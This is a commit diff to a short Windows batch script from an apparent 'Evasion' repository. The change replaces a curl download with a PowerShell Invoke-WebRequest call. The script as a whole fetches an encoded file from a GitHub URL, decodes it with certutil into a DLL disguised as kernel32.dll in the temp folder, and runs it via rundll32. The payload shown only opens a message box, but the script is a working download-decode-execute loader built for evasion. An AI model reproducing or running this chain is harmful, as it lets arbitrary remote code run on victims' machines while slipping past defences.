7dcc831b3d2bdd1c24187e210a13bf0f5b5e1eb7
fab <59584067+FabFromTheSnow@users.noreply.github.com>
2023-04-26 17:54:13 -0400

    Update oui.bat

--- oui.bat
+++ oui.bat
@@ -1,4 +1,5 @@
 @echo off
-curl -s https://raw.githubusercontent.com/FabFromTheSnow/Evasion/main/dll.txt > "%temp%\dll.txt"
+powershell -command "Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/FabFromTheSnow/Evasion/main/dll.txt' -OutFile '%temp%\dll.txt'"
 certutil -decode "%temp%\dll.txt" "%temp%\kernel32.dll"
-rundll32.exe "%temp%\kernel32.dll",ShellExecuteA 0 "open" "http://www.openai.com" NULL NULL SW_SHOWNORMAL
+rundll32.exe "%temp%\kernel32.dll",MessageBoxA 0 "Hello from kernel32.dll!" "Message" 0x40
+
